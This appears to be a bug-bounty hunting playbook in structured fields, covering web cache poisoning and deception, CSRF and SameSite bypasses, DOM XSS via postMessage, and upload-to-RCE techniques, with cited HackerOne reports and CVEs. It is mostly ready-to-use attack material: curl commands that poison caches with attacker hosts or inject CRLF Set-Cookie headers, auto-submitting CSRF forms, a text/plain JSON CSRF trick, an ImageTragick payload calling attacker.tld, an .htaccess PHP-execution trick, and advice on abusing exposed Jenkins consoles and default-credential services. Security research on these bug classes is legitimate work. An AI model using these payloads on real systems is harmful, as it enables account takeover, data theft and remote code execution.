patterns.name: Unkeyed `X-Forwarded-Host` reflection
patterns.when_to_suspect: Response carries `Cache-Control: public` or `Age:` header. Body or response headers contain the request `Host` value (canonical link, JS src, CSP report-uri).
patterns.test: Send a cache-buster request: `curl -H 'X-Forwarded-Host: evil.attacker.tld' 'https://target/page?cb=$(uuidgen)'`. Inspect the response — does `evil.attacker.tld` appear in the body? Now without the header but with the same `cb=` value: does the poisoned body persist?
patterns.validation: A *clean* curl (no header, same `cb=` value) from a *different* IP returns the poisoned response within the cache TTL window. The attacker payload appears in a script tag, link tag, or redirect.
patterns.pay_grade_rationale: High to critical. Persistent JS-source poisoning chains directly to mass XSS.

patterns.name: Unkeyed `X-Original-URL` / `X-Rewrite-URL`
patterns.when_to_suspect: Application is .NET or Java behind an IIS / nginx / Apache rewrite layer. Server respects these headers to override the request path internally but does not include them in the cache key.
patterns.test: `curl -H 'X-Original-URL: /admin' 'https://target/public-page?cb=...'`. Observe whether the response body contains admin-page content. Then fetch `/public-page?cb=...` cleanly.
patterns.validation: Clean request returns admin-page content from the cache.
patterns.pay_grade_rationale: Critical when admin content is exposed to unauthenticated visitors.

patterns.name: `X-Forwarded-Scheme` / `X-Forwarded-Proto` redirect loop / SSL strip
patterns.when_to_suspect: Application generates absolute URLs based on `X-Forwarded-Scheme`. Setting `X-Forwarded-Scheme: http` on an HTTPS request produces internal redirects to `http://target/...`.
patterns.test: `curl -H 'X-Forwarded-Scheme: http' 'https://target/login?cb=...'`. Inspect Location header in the cached response.
patterns.validation: Clean request returns a 301/302 to `http://target/login`, downgrading any victim's connection to HTTP and enabling MITM or cookie exposure on insecure transport.
patterns.pay_grade_rationale: Medium to high — DoS plus credential-exposure chain.

patterns.name: Web Cache Deception via static extension append
patterns.when_to_suspect: Authenticated, user-specific endpoint (`/account`, `/api/me`, `/dashboard`). Origin uses permissive path routing (Rails, Express, FastAPI). CDN treats static extensions as cacheable.
patterns.test: Authenticate as victim. `curl -b "session=VICTIM" 'https://target/account/x.css'`. Inspect response — is it the victim's account HTML with `Content-Type: text/html`? Now fetch `https://target/account/x.css` without auth from a clean session.
patterns.validation: Clean fetch returns the victim's account HTML — PII, tokens, session indicators visible.
patterns.pay_grade_rationale: Critical. Direct PII / session-token disclosure to anyone who guesses or is given the URL.

patterns.name: Cache Deception via path traversal in extension
patterns.when_to_suspect: Origin treats `/account/profile/..%2F..%2Fadmin` as `/admin` after URL decode. CDN treats the path verbatim and caches under the literal key.
patterns.test: `curl -b "session=ADMIN" 'https://target/public-asset.css/..%2F..%2Fadmin'`. Inspect content. Then fetch the same URL cleanly.
patterns.validation: Clean fetch returns admin content cached under a public-asset-looking URL.
patterns.pay_grade_rationale: Critical.

patterns.name: HTTP Parameter Pollution → cache-key bypass
patterns.when_to_suspect: Application uses one of `?param=` instances; cache uses the full querystring as key.
patterns.test: `?param=safe&param=<payload>` — backend reads last value, cache keys on full string. Or `?param=<payload>&utm_source=x` — cache normalizes UTM params away, key drops the payload but backend still sees it.
patterns.validation: Clean request to `?param=safe` returns the cached payload-tainted response.
patterns.pay_grade_rationale: High.

patterns.name: Cache-key normalization mismatch (trailing slash, case)
patterns.when_to_suspect: Cache treats `/Account` and `/account` as distinct keys; origin normalizes case. Same for trailing slash, encoded slashes (`%2F`), and unicode equivalents.
patterns.test: Poison `/Account?cb=x` with a header attack. Victim navigates to `/account?cb=x` and either receives the poison (origin returns the user's account page; cache may serve the cached response) or doesn't. The mismatch can also be exploited in reverse — poison a path the victim is likely to hit by tricking the cache into treating the case-variant as the same key.
patterns.validation: Confirmed cache HIT on the normalized variant returning the poisoned body.
patterns.pay_grade_rationale: Medium to high depending on what content is poisoned.

patterns.name: Cache poisoning via newline injection in unsanitized header reflection
patterns.when_to_suspect: Header value is reflected into a response header (Location, Link) without CRLF filtering. Older proxies and some custom servers fail to filter `\r\n` in header values.
patterns.test: `curl -H $'X-Forwarded-Host: evil.tld\r\nSet-Cookie: attacker=1; Path=/' 'https://target/page'`. If the proxy reflects the header into a Set-Cookie or another header, the cache stores the injected header.
patterns.validation: Clean fetch returns the injected Set-Cookie or other header attached to the cached response.
patterns.pay_grade_rationale: High. CRLF-in-cache poisoning is a force multiplier for session fixation.

patterns.name: Content-type confusion (cached JSON served as HTML)
patterns.when_to_suspect: Endpoint returns JSON for one request type and HTML for another. Cache stores response keyed on URL alone; the next request gets the wrong content-type.
patterns.test: Send a request that triggers HTML (e.g. `Accept: text/html` and a path that errors); cache stores it. Send a request that should get JSON (Accept: application/json) — cache may serve the HTML, which could include a polyglot XSS payload.
patterns.validation: Clean fetch with JSON-expecting client returns HTML with embedded script.
patterns.pay_grade_rationale: Medium to high if the wrong content-type leads to script execution.

patterns.name: Cache DoS via cached error response
patterns.when_to_suspect: Origin returns 4xx or 5xx for certain malformed inputs (bad headers, oversized headers, unparseable cookies). CDN does not have a "do not cache errors" rule.
patterns.test: `curl -H 'X-Forwarded-Host: $(python -c "print(\"A\"*8192)")' 'https://target/critical-asset.js?cb=...'`. Backend returns 502; CDN caches it. Now fetch `https://target/critical-asset.js?cb=...` cleanly.
patterns.validation: Clean fetch returns 502 from cache, breaking the asset for all users routed through that edge.
patterns.pay_grade_rationale: Medium to high. Service denial scoped to CDN edge.

patterns.name: Vary header omission cross-tenant bleed
patterns.when_to_suspect: Multi-tenant application serves tenant-specific content based on `Host`, a custom tenant header, or a cookie. Cache does not include the tenant key in `Vary`.
patterns.test: Fetch tenant A's page from cache. Fetch the same URL with tenant B's host/header. If the cache returns tenant A's body to tenant B, the cache leaks cross-tenant.
patterns.validation: Tenant B's user receives tenant A's account data.
patterns.pay_grade_rationale: Critical.

patterns.name: Cookie poisoning via reflected Set-Cookie
patterns.when_to_suspect: Application reflects a value from a cookie into the response and the value is also part of `Set-Cookie` in a cached response.
patterns.test: Visit `/page` with a malicious cookie value. The response Set-Cookie or response body reflects the cookie. If cached, future visitors receive the cached Set-Cookie or reflected content.
patterns.validation: A second client fetching cleanly gets the poisoned Set-Cookie or reflected payload.
patterns.pay_grade_rationale: High.

patterns.name: Persistent vs. session cache distinction
patterns.when_to_suspect: Some CDNs store responses per-edge (Cloudflare PoPs, Akamai edges). The poison may only affect one edge.
patterns.test: Use a routing technique to send the poisoning request through a target PoP (`curl --resolve target.tld:443:<edge-ip>`). Confirm by fetching from a second client routed through the same PoP.
patterns.validation: Same-PoP victim receives the poison; victim on a different PoP does not. Document the blast radius accurately.
patterns.pay_grade_rationale: Scales with blast radius — single edge is Medium, global is Critical.

patterns.name: `pragma: no-cache` / `Cache-Control: private` bypass via static-asset rule
patterns.when_to_suspect: Application sets `Cache-Control: private` on user pages, but the CDN has a global rule "cache `.css` for 1 hour regardless of Cache-Control."
patterns.test: Web Cache Deception path technique combined with the static-asset rule.
patterns.validation: Authenticated content cached despite `private` header.
patterns.pay_grade_rationale: Critical.

cited_examples.name: Challenge token reuse / omission → protection skipped
cited_examples.source: Disclosed across multiple programs (<https://hackerone.com/reports/206653>, <https://hackerone.com/reports/210417>, <https://hackerone.com/reports/246801>).
cited_examples.pattern_shape: The captcha/challenge response token is reusable, verifiable-once-then-reusable, or the request succeeds when the token param is removed/empty — so the protected action (login, register, OTP) proceeds unthrottled.
cited_examples.key_trick: Solve once, then replay the token N times; also try deleting the token param and sending an empty value. If the action still completes, the control is bypassed. Chain to `hunt-brute-force`.
cited_examples.why_it_matters: Re-enables the brute-force/mass-abuse the captcha existed to stop; severity = the unlocked action.

cited_examples.name: Further disclosed reports (this class)
Framed sensitive action → account takeover / state change
cited_examples.source: Disclosed across multiple programs (<https://hackerone.com/reports/2119892>, <https://hackerone.com/reports/643274>, <https://hackerone.com/reports/85624>).
cited_examples.pattern_shape: A consequential action (email change, OAuth grant, connect-account, delete) is reachable in a frame with no frame-ancestors policy. A UI-redress overlay tricks the victim into completing it.
cited_examples.key_trick: Frame the sensitive endpoint, overlay decoy UI, and confirm the state change fires from a victim click. A missing `X-Frame-Options` on a static page is Info; on a state-changing authenticated action it's the bug. Show the completed action.
cited_examples.why_it_matters: Escalates a 'missing header' Info into a real ATO/state-change. The consequence of the framed action is the severity.

cited_examples.name: Further disclosed reports (this class)
Internet-exposed admin / CI console with weak or any-account auth → RCE
cited_examples.source: A production Jenkins instance that accepted login with any valid Google account, yielding job execution (<https://hackerone.com/reports/231460>, $15,000).
cited_examples.pattern_shape: A CI/admin console (Jenkins, Grafana, Kibana, Airflow, a cloud dashboard) is reachable from the internet with weak SSO ("any Google account"), default creds, or skip-login. Console access → arbitrary job/build execution → RCE and secret theft.
cited_examples.key_trick: Fingerprint the console (favicon, `/login`, headers), then test whether *any* account or an unscoped SSO domain is accepted. On Jenkins, `/script` (Groovy console) is RCE once in. Confirm access read-only before stopping.
cited_examples.why_it_matters: One exposed CI console = code execution + pipeline secrets. Consistently Critical.

cited_examples.name: Cloud/SaaS credentials committed to a public artifact
cited_examples.source: A cloud IdP API key in a public GitHub repository granting infrastructure access (<https://hackerone.com/reports/716292>).
cited_examples.pattern_shape: An AWS/GCP/IdP/SaaS key is committed to a public repo, gist, or shipped artifact. Unlike a scoped client key, these carry infra/admin scope — possession grants console or API access to the environment.
cited_examples.key_trick: Scan the org's public repos + members' repos (trufflehog, gitleaks) and validate scope read-only (`sts get-caller-identity`, IdP `whoami`). Overlaps `hunt-source-leak`; kept here when the credential unlocks *cloud infrastructure*.
cited_examples.why_it_matters: Direct infra compromise from a single leaked key.

cited_examples.name: Public / world-writable object storage
cited_examples.source: A publicly-readable S3 bucket exposing internal assets (<https://hackerone.com/reports/1021906>, $2,900); an open S3 bucket allowing anonymous listing and download (<https://hackerone.com/reports/361438>).
cited_examples.pattern_shape: An S3/GCS/Azure bucket allows anonymous `GetObject`/`ListBucket` (data exposure) or `PutObject`/`PutObjectAcl` (world-writable → content injection, supply-chain). Bucket names are guessable from the org/app name.
cited_examples.key_trick: Enumerate bucket names (`<org>-assets`, `<app>-prod`, permutations), test anonymous `ListBucket` and a benign `PutObject`. Public *write* is far more severe than public read — always test both.
cited_examples.why_it_matters: The highest-frequency cloud finding; write-access chains to stored XSS / supply-chain.

cited_examples.name: Exposed data / messaging service with default or no auth
cited_examples.source: A staging RabbitMQ broker exposed to the internet with default credentials (<https://hackerone.com/reports/753602>).
cited_examples.pattern_shape: A message broker (RabbitMQ/Kafka), database (Redis/Elasticsearch/Mongo), or management port is internet-reachable with default (`guest:guest`) or absent auth, exposing queues, data, and often live credentials/tokens flowing through them.
cited_examples.key_trick: Port-scan the public range for broker/DB management ports (15672, 9200, 6379, 27017); test default creds and unauthenticated management APIs. Capture what flows through before reporting.
cited_examples.why_it_matters: Non-prod brokers routinely carry prod secrets; relocated here from `hunt-source-leak` because the pivot is the exposed *service*, not a source artifact.

cited_examples.name: Further disclosed reports (this class)
Gmail email-filter CSRF (2007)
cited_examples.source: Disclosed by researchers at GNUCITIZEN in 2007, widely documented in OWASP CSRF references and in countless web-security textbooks since. The bug is historic but is the canonical "real money" CSRF case study because it persisted, was exploitable in the wild, and had clear account-takeover impact.
cited_examples.pattern_shape: Gmail's filter-creation endpoint accepted authenticated POST requests without an anti-CSRF token. A malicious page could submit a hidden form that created a new mail filter forwarding every incoming message to an attacker-controlled address. The victim's account was silently siphoned in real time with no UI indication.
cited_examples.key_trick: The attacker did not need to compromise the password or any session token. The action was state-changing, cross-origin requests sent the auth cookie automatically, and the target trusted the cookie as evidence of intent. The forward-rule action also persisted across logins — a one-shot CSRF created indefinite mailbox exfil.
cited_examples.why_it_matters: This bug is why every web framework after 2008 ships some form of CSRF token middleware by default. Operators auditing legacy enterprise apps, on-prem mail systems, and internal admin consoles still find exactly this shape — POST endpoint, no token, persistent state change. The lesson is "if it changes state and only requires a cookie, it's a candidate, no matter how old or 'enterprise' the target is."

cited_examples.name: Chrome SameSite=Lax-by-default (2020)
cited_examples.source: Chromium project announcement and Chrome 80 release notes, February 2020. Subsequently adopted by Firefox and Edge. Documented in the Chromium SameSite-by-default rollout pages and in the IETF draft for the SameSite cookie attribute.
cited_examples.pattern_shape: Before this change, cookies without an explicit `SameSite` attribute were treated as `SameSite=None` — automatically sent on cross-origin requests, including the simple form POSTs that classic CSRF relies on. After Chrome 80 (and equivalent later versions in other browsers), missing `SameSite` defaults to `Lax`, which strips the cookie from cross-origin POSTs but still sends it on top-level GET navigations.
cited_examples.key_trick: This is a defense-shift, not a defense-elimination. State-changing GET endpoints, top-level navigation with redirects that convert to POST inside the same origin, and applications that explicitly set `SameSite=None` to support embed scenarios all remain CSRF-vulnerable. Operators must check the actual `Set-Cookie` header — not assume protection by browser default.
cited_examples.why_it_matters: Many programs now reject CSRF reports with "modern browsers default to SameSite=Lax." That triage outcome is wrong when the cookie is explicitly `SameSite=None`, when the endpoint accepts GET, or when the chain involves a top-level navigation. Operators who quote the actual `Set-Cookie` header in the report — and demonstrate the working PoC in the latest stable Chrome — defeat that downgrade attempt.

cited_examples.name: Grafana CVE-2022-21703 (anti-CSRF bypass)
cited_examples.source: Grafana security advisory `GHSA-xc3p-ff4j-pj7p`, February 2022. CVE-2022-21703. Affects Grafana versions prior to 7.5.15, 8.3.5, 8.4.3.
cited_examples.pattern_shape: Grafana shipped anti-CSRF protection that relied on the request's `Content-Type` header being one of a known list. A cross-origin POST with a non-listed `Content-Type` (or a `text/plain` body smuggling JSON) bypassed the CSRF check entirely on authenticated API endpoints — including endpoints capable of executing data-source plugin actions and creating administrative API keys.
cited_examples.key_trick: The vulnerability lived in a defense-in-depth check that *should* have failed safe. Operators encountering "we have a CSRF check, you can't have CSRF" should verify the check by enumerating the allowed Content-Types and trying every other one. Frameworks frequently allow-list `application/json` and `application/x-www-form-urlencoded` while forgetting `text/plain`, `multipart/form-data` without boundary, or vendor-specific MIME types.
cited_examples.why_it_matters: Grafana ships on internal dashboards across most modern engineering orgs and is frequently exposed externally on subdomains. Version recon (`/api/health` returns the version) plus a CVE-2022-21703 PoC against an unpatched instance is a tier-1 paid finding pattern. Beyond Grafana itself, the *shape* of the bug — Content-Type allow-list with a gap — generalizes to many internal admin consoles.

cited_examples.name: PortSwigger CSRF research and Burp CSRF PoC generator
cited_examples.source: PortSwigger Web Security Academy CSRF labs, multi-year body of work documented at portswigger.net/web-security/csrf. The Burp Suite CSRF PoC generator (right-click → Engagement Tools → Generate CSRF PoC) is the operator-standard tool for demonstrating CSRF reproducibly in reports.
cited_examples.pattern_shape: PortSwigger's research catalogues real defense bypasses that map directly to operator probes: token-tied-to-session-but-not-user, token-validated-only-when-present (omit the token entirely), token-matches-cookie (double-submit), Referer-header-check bypasses, and the JSON-via-text/plain trick. Each lab corresponds to a finding shape seen in real bounty programs.
cited_examples.key_trick: The labs are not theory — they replicate disclosed bug shapes. Operators who have not worked through the labs miss the "token validation is too lenient" class entirely.
cited_examples.why_it_matters: Citing the lab/topic in a report demonstrates the bug is a known class with documented impact, which shortcuts triage debates. The training is also operator-grade hands-on practice for the exact probes used in real CSRF hunting.

cited_examples.name: CSRF protection missing / bypassable on a sensitive function
cited_examples.source: A management-console CSRF-protection bypass (via a path-traversal in the token path) on an enterprise server (<https://hackerone.com/reports/1497169>, $10,000); an integration-setup flow lacking CSRF protection (<https://hackerone.com/reports/170552>, $2,500).
cited_examples.pattern_shape: A state-changing endpoint either omits an anti-CSRF token, accepts requests without validating it, or the token check is bypassable (predictable, reflected, or reachable via a traversal/parser quirk). An attacker-hosted page forces the victim's authenticated browser to perform the action.
cited_examples.key_trick: For each sensitive POST, strip the CSRF token and replay; swap it for another user's; change `Content-Type` to bypass a naive check; test whether the token is validated at all. Confirm the action executes cross-origin.
cited_examples.why_it_matters: Classic but still pays on admin/integration/config endpoints where the impact is high.

cited_examples.name: Mobile deeplink / cross-app CSRF
cited_examples.source: A mobile-app deeplink used to perform a CSRF "follow" action (<https://hackerone.com/reports/583987>, $1,540).
cited_examples.pattern_shape: A mobile app registers a deeplink/custom-URL-scheme handler that triggers a state-changing action using the app's authenticated session, without an origin/intent check — a web page or another app invokes the deeplink to force the action.
cited_examples.key_trick: Enumerate the app's deeplinks/intent filters; craft one that performs a sensitive action and trigger it from a web page. Pairs with `hunt-dom`/mobile redteam skills.
cited_examples.why_it_matters: The mobile analog of CSRF, frequently missed because web CSRF defenses don't cover custom schemes.

cited_examples.name: CSRF / XSSI chained to token or data theft → ATO
cited_examples.source: An issue leaking an access token alongside other third-party data via insufficient URL validation (<https://hackerone.com/reports/1923672>, $2,450); XSSI enabling email-address theft and posting on the victim's behalf (<https://hackerone.com/reports/450796>, $3,500).
cited_examples.pattern_shape: A cross-site request reads a response containing secrets — an OAuth code, an access token, or PII — because the endpoint returns sensitive JSON without anti-XSSI protection, or a redirect/validation flaw leaks the token cross-origin.
cited_examples.key_trick: Look for JSON/JS endpoints that return secrets and lack `X-Content-Type-Options`/parser guards; test cross-origin readability. Chains to `hunt-ato` when the leaked value is an auth token.
cited_examples.why_it_matters: Elevates CSRF/XSSI from "force an action" to "steal the session."

cited_examples.name: Further disclosed reports (this class)

patterns.name: Classic POST CSRF — no token, cookie-authed
patterns.when_to_suspect: POST endpoint that changes state (email change, password change, friend add, money transfer, settings update). No CSRF token in the form. Session cookie has no `SameSite` attribute set, or is explicitly `SameSite=None`.
patterns.test: Capture the legitimate request in Burp. Strip the `Origin`, `Referer`, and any non-cookie auth header. Replay with only the cookie. If it succeeds, build the HTML PoC: `<form action="https://target/settings" method="POST"><input name="email" value="attacker@evil"></form><script>document.forms[0].submit()</script>`.
patterns.validation: Host the PoC on attacker.tld. From a second browser logged into a victim test account, visit the PoC URL. Confirm the state change in the victim's account (email field now reads attacker@evil).
patterns.pay_grade_rationale: Medium typically; high when the action is account-affecting (email change, password reset trigger, MFA disable) and chains to ATO.

patterns.name: GET-based CSRF for state change
patterns.when_to_suspect: Application uses GET for actions that should be POST/PUT/DELETE — `/account/delete?id=42`, `/transfer?to=x&amount=100`, `/admin/disable_user?u=victim`. Often in legacy admin panels and internal tools.
patterns.test: `` or `Click for prize` for top-level navigation. GET requests bypass SameSite=Lax for top-level navigations.
patterns.validation: From a clean victim browser, visit a page hosting the `` tag or click the link. Confirm the action executed.
patterns.pay_grade_rationale: High. GET-based state change is also a violation of HTTP semantics; many programs treat it as a higher-severity finding than "missing CSRF token" because the fix requires API redesign.

patterns.name: JSON-body CSRF via `enctype="text/plain"`
patterns.when_to_suspect: API endpoint accepts `Content-Type: application/json` and processes a JSON body. Cookie auth. Server does not enforce a custom header check (no `X-Requested-With` required, no preflight tripped).
patterns.test: Craft an HTML form where the input names plus values produce a valid JSON string when submitted as `text/plain`. Example: `<form action="https://target/api/transfer" method="POST" enctype="text/plain"><input name='{"to":"attacker","amount":100,"x":"' value='ignore"}'></form>`. The browser sends `{"to":"attacker","amount":100,"x":"=ignore"}` as the body with `Content-Type: text/plain`, which is a CORS-simple request — no preflight.
patterns.validation: Server processes the body as JSON (because most JSON parsers are content-type-agnostic) and executes the action.
patterns.pay_grade_rationale: Medium to high. The bug class is recurrent because developers assume `application/json` content-type enforcement equals CSRF protection.

patterns.name: CORS misconfiguration with credentials → reflected-origin CSRF
patterns.when_to_suspect: Response carries `Access-Control-Allow-Origin: <reflected request origin>` and `Access-Control-Allow-Credentials: true`. The endpoint is sensitive and accepts cookies.
patterns.test: From attacker.tld, send a `fetch('https://target/api/secret', {credentials: 'include'})`. If the response is readable, the attacker can read authenticated content cross-origin. For state change, send a POST instead.
patterns.validation: Browser console at attacker.tld logs the response body or the action's success indicator.
patterns.pay_grade_rationale: High. Reflected-origin with credentials is a strict policy violation; chains to data exfil and CSRF simultaneously.

patterns.name: SameSite=Lax bypass via top-level navigation + GET
patterns.when_to_suspect: Cookie is `SameSite=Lax`. State-changing endpoint accepts GET (or accepts POST but redirects POST→GET via 302).
patterns.test: Plant the action URL in a link or auto-navigate via `window.location = 'https://target/action?...'`. SameSite=Lax sends the cookie on top-level navigations, including GETs.
patterns.validation: Action executes in victim's session.
patterns.pay_grade_rationale: Medium. Often dismissed by triage as "expected SameSite=Lax behavior" — counter by quoting the cookie header and demonstrating clear state change.

patterns.name: SameSite bypass via attacker-controlled subdomain
patterns.when_to_suspect: Target has subdomain wildcard cookies (`Domain=.target.tld`) or has any subdomain takeover, XSS, or open-redirect on `*.target.tld`. SameSite=Lax/Strict treats `evil.target.tld` as same-site for cookie purposes.
patterns.test: From the controlled subdomain (`takenover.target.tld` or `xss.target.tld`), execute the CSRF — cookies are sent as same-site.
patterns.validation: Action executes. Document the chain: subdomain takeover → CSRF.
patterns.pay_grade_rationale: Critical chain. Standalone subdomain takeover may pay Low-Medium; chained with a CSRF-only state change it reaches High.

patterns.name: Token-not-tied-to-session reuse
patterns.when_to_suspect: Application includes a CSRF token, but the token looks deterministic, short-lived, or per-application instead of per-session.
patterns.test: Log into two test accounts in two browsers. Grab user A's token from a form. Submit user B's state-change request using user A's token. If accepted, the token is not session-bound.
patterns.validation: Action executes for user B with user A's token. Or: grab a token from an unauthenticated page (login form), use it on an authenticated state change.
patterns.pay_grade_rationale: Medium. The exploit requires the attacker to first fetch a valid token, but in many designs the token is leaked in HTML to anonymous visitors.

patterns.name: Referer-header-check bypass via omission
patterns.when_to_suspect: Server validates `Referer` matches origin. Defense looks robust but the implementation may "fail open" when `Referer` is missing.
patterns.test: Send the CSRF request from a page that strips Referer — `<meta name="referrer" content="no-referrer">`, an `https→http` redirect chain, or `Referrer-Policy: no-referrer` on the attacker page.
patterns.validation: Request succeeds without Referer because validation logic treats absence as "internal request."
patterns.pay_grade_rationale: Medium to high.

patterns.name: Origin-header-check bypass via `null` origin
patterns.when_to_suspect: Server validates `Origin` header. Defense looks robust but may accept `Origin: null`.
patterns.test: Trigger the request from a sandboxed iframe: `<iframe sandbox="allow-scripts allow-forms" src="data:text/html,<form>..."></iframe>`. Sandboxed iframes send `Origin: null`. Also: `file://` origin sends `Origin: null` on some browsers, and certain redirect chains drop the Origin header.
patterns.validation: Request succeeds because validator treats `null` as same-origin or as a special-case bypass.
patterns.pay_grade_rationale: Medium to high.

patterns.name: Method-override smuggling (`X-HTTP-Method-Override`)
patterns.when_to_suspect: Backend framework supports method override headers — Express, Rails (`_method` query param), Symfony (`X-HTTP-Method-Override`). Application's CSRF middleware checks the HTTP method *as received*, not the overridden method.
patterns.test: POST with `X-HTTP-Method-Override: DELETE` (or `_method=DELETE` in form body) — CSRF middleware sees POST and waves it through, but the framework dispatches the request as DELETE. Cookies attach as normal.
patterns.validation: Sensitive DELETE/PUT executes via a POST request.
patterns.pay_grade_rationale: High. The bug is a defense-in-depth gap; the application thought DELETE was protected by being non-simple, but the override re-enables CSRF.

patterns.name: Login CSRF for account hijacking
patterns.when_to_suspect: Login endpoint accepts cross-origin POST with credentials and has no CSRF token. The attacker can force a victim to log into the *attacker's* account.
patterns.test: Build a form-POST to `/login` with attacker credentials. Force the victim's browser to submit it. The victim is now logged in as the attacker — any data they enter (search queries, profile updates, payment info) lands in the attacker's account, accessible later.
patterns.validation: Victim's browser session shows attacker's account. Combined with self-XSS in attacker's profile, this becomes XSS-on-victim.
patterns.pay_grade_rationale: Medium standalone; high when chained with self-XSS or with payment-info capture.

patterns.name: Logout CSRF (DoS / phishing chain)
patterns.when_to_suspect: Logout endpoint is GET-accessible with no CSRF protection.
patterns.test: `` from any cross-origin page. Logs the victim out.
patterns.validation: Victim session destroyed.
patterns.pay_grade_rationale: Low standalone (annoyance), Medium when chained — force logout + phishing the re-login flow on a controlled subdomain.

patterns.name: OAuth `state` parameter missing or unvalidated → account-link CSRF
patterns.when_to_suspect: OAuth callback endpoint `/auth/callback?code=...&state=...` accepts requests with missing or unvalidated `state` parameter. Provider issues authorization codes that can be redeemed by the SP without binding to the user that initiated the flow.
patterns.test: Initiate an OAuth link flow as the attacker, capture the authorization code from the IDP, then forge a callback URL `https://target/auth/callback?code=<attacker_code>` and deliver to the victim. Victim's browser hits the callback, target redeems the code, links attacker's IDP identity to victim's account.
patterns.validation: Victim's account now has attacker's social/SSO identity attached. Attacker can log in via SSO and reach victim's account.
patterns.pay_grade_rationale: Critical. Account takeover via the OAuth-link flow. See also `hunt-oauth`.

cited_examples.name: postMessage handler with missing / incomplete origin validation → DOM XSS
cited_examples.source: Incomplete origin validation on a `message` handler gave DOM-based XSS on a login page (<https://hackerone.com/reports/603764>); a `window.postMessage` from any remote origin triggered XSS across all stores of a SaaS platform (<https://hackerone.com/reports/231053>, $3,000); a marketing-form page (<https://hackerone.com/reports/398054>) and a payments subdomain (<https://hackerone.com/reports/900619>) both mishandled `postMessage`.
cited_examples.pattern_shape: A page registers `window.addEventListener('message', ...)` and uses `event.data` (writing it to `innerHTML`, passing to `eval`, or building a script/URL) **without validating `event.origin`** against an allowlist. Any page that can open/iframe the target sends a crafted message and lands script in the target's origin.
cited_examples.key_trick: Grep the JS bundle for `addEventListener("message"` / `onmessage` and trace `event.data` to a sink. Confirm the handler either omits the `event.origin` check or uses a bypassable one (`indexOf`, `endsWith`, regex without anchors). Host a PoC page that frames the target and posts the payload.
cited_examples.why_it_matters: Executes despite server-side XSS defenses; reachable cross-origin. The canonical modern DOM-XSS class.

cited_examples.name: URL-derived data into a DOM sink (fragment / query → innerHTML/eval)
cited_examples.source: A reflected DOM XSS via a settings parameter on an ads endpoint (<https://hackerone.com/reports/1549451>); a search parameter flowing to a DOM sink (<https://hackerone.com/reports/868934>).
cited_examples.pattern_shape: Client-side JS reads `location.hash`/`location.search`/a query param and writes it into a DOM sink (`innerHTML`, `document.write`, `$(...).html()`, `eval`, a dynamic `<script src>`) without encoding. The payload never reaches the server, so WAF/server filters don't apply.
cited_examples.key_trick: Test payloads in the URL *fragment* (after `#`) first — fragments are never sent to the server, proving the sink is purely client-side. Use the browser's debugger to break on the sink (`innerHTML` setter) and confirm the taint path.
cited_examples.why_it_matters: The half of XSS that server-side testing misses entirely; pairs with `hunt-xss` for the full surface.

cited_examples.name: Further disclosed reports (this class)
ImageTragick (CVE-2016-3714)
cited_examples.source: Public disclosure of multiple ImageMagick vulnerabilities in May 2016, branded "ImageTragick" by the discoverer (Stewie). CVE-2016-3714 is the canonical RCE entry; companion CVEs cover file read, SSRF, and additional command-execution sinks. Public advisories from Red Hat, Debian, and the ImageMagick maintainers.
cited_examples.pattern_shape:
ImageMagick's MVG (Magick Vector Graphics) and MSL (Magick Scripting Language) parsers accepted attacker-controlled commands. A specially crafted file disguised as an image (correct magic bytes for JPEG/PNG/GIF, but containing MVG content) would, when processed by ImageMagick, execute arbitrary shell commands. The classic payload `push graphic-context
encoding "UTF-8"
image Over 0,0 0,0 'url(https://attacker.tld/x)'
pop graphic-context` triggered an outbound HTTP request from the server.
cited_examples.key_trick: The vulnerability lived in the *delegate* mechanism — ImageMagick called external programs (ghostscript, mvg parser) based on file content. Magic-byte validation did not protect because the file genuinely was a valid image *and* a valid MVG. The fix required either disabling the affected delegates in `policy.xml` or upgrading to a patched ImageMagick.
cited_examples.why_it_matters: ImageMagick is on every photo-handling, avatar, thumbnail, and report-generation pipeline. The class of bug — "third-party tool processes uploaded content with unexpected privileges" — recurs in ghostscript (PostScript file → RCE), LibreOffice (DOCX → RCE), ffmpeg (HLS playlist → SSRF), and exiftool. Operators encountering any upload feature with downstream processing should test the polyglot/delegate class before classifying as Low.

cited_examples.name: Sam Thomas — "It's a PHP Unserialization Vulnerability Jim, but Not as We Know It" (Black Hat USA 2018)
cited_examples.source: Sam Thomas, Black Hat USA 2018 talk. The research established the `phar://` stream wrapper attack: PHP automatically deserializes the metadata of a Phar archive whenever a `phar://` URL is referenced by a stream-aware function (`file_exists`, `fopen`, `file_get_contents`, `is_file`, `md5_file`, etc.).
cited_examples.pattern_shape: Attacker uploads a Phar file disguised as an image (correct JPEG/PNG magic bytes prepended to the Phar structure — PHP does not validate the file extension when reading metadata, it scans for the Phar marker). The application later references the uploaded file via a stream-aware function. PHP unserializes the Phar metadata, instantiating attacker-chosen classes; if any reachable class has a `__destruct` or `__wakeup` magic method that reaches a sink, the attacker achieves RCE.
cited_examples.key_trick: The attack does not require `unserialize()` to be called explicitly. The trigger is *any* PHP function that touches `phar://` paths, and the wrapper is invoked transparently. Stream-aware functions are everywhere in PHP code — image-handling, file-existence checks, hash calculations.
cited_examples.why_it_matters: Many PHP applications survived a decade of `unserialize` audits but are still vulnerable through the Phar wrapper. The pattern is "upload a polyglot Phar/JPEG, then trigger a stream operation on the uploaded file's path." The fix landed in PHP 8.0 (auto-unserialize disabled) but legacy PHP 7.x deployments remain widespread.

cited_examples.name: Apache mod_cgi `.htaccess` upload pattern (multi-CVE class)
cited_examples.source: Multiple Apache HTTPD security advisories and bounty disclosures across years documenting the same pattern. Apache HTTP Server documentation explicitly warns about user-controlled `.htaccess` files. Recurrent in shared-hosting and CMS upload features.
cited_examples.pattern_shape: A web app permits upload of arbitrary file types including `.htaccess`. The attacker uploads `.htaccess` containing `AddType application/x-httpd-php .png` (or `AddHandler` directives) into a directory that previously served images statically. The next image upload (e.g., `shell.png` containing PHP source) is now executed by mod_php when requested.
cited_examples.key_trick: The bug is not in the upload validation per se — it is in the per-directory configuration override. Operators auditing upload features should always test whether `.htaccess` is accepted, and whether the upload directory has `AllowOverride None` (safe) or `AllowOverride All` (unsafe).
cited_examples.why_it_matters: Apache + PHP shared hosting deployments are still common on enterprise legacy hosts and mid-tier CMS platforms (older WordPress hosting, Drupal sites, custom PHP apps). One `.htaccess` upload converts a benign image-upload feature into RCE.

cited_examples.name: CVE-2017-12615 / CVE-2017-12617 — Tomcat PUT method RCE
cited_examples.source: Apache Tomcat security advisory September-October 2017. CVE-2017-12615 (Windows) and CVE-2017-12617 (Linux). Listed on CISA's Known Exploited Vulnerabilities catalogue.
